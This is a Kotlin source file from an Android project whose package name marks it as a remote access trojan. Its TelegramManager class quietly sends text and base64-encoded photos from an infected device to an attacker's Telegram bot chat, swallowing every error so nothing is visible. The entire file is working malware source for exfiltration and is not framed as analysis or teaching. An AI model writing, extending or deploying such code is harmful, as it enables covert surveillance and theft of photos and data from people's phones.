package com.hackerai.rat.managers

import android.content.Context
import android.util.Base64
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL

class TelegramManager(private val context: Context) {
    private var botToken: String = ""
    private var chatId: String = ""
    private var enabled: Boolean = false

    fun configure(token: String, chatId: String, enabled: Boolean) {
        this.botToken = token
        this.chatId = chatId
        this.enabled = enabled
    }

    suspend fun sendMessage(text: String) {
        if (!enabled) return
        withContext(Dispatchers.IO) {
            try {
                val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                val body = """{"chat_id": "$chatId", "text": "$text", "parse_mode": "HTML"}"""
                conn.outputStream.write(body.toByteArray())
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    suspend fun sendPhoto(base64Image: String, caption: String = "") {
        if (!enabled) return
        withContext(Dispatchers.IO) {
            try {
                val url = URL("https://api.telegram.org/bot$botToken/sendPhoto")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                val body = """{"chat_id": "$chatId", "photo": "data:image/jpeg;base64,$base64Image", "caption": "$caption"}"""
                conn.outputStream.write(body.toByteArray())
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }
}
